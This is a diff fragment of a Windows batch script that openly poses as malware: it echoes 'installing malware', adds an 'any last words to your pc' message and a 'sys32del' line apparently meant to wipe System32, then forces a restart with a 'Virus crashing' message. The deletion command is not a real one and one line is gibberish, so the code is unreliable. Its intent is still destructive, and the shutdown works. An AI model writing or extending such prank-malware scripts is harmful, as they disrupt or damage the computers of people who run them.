@@ -199,4 +199,6 @@ echo installing malware this will take 3 minutes
 echo {/}==========={([~||~])}==========={\}
 pause 
 hsbthg836676hshjut^^^^^^^^²¹
+echo any last words to your pc
+sys32del
 shutdown -r -t 180 -c "Virus crashing"
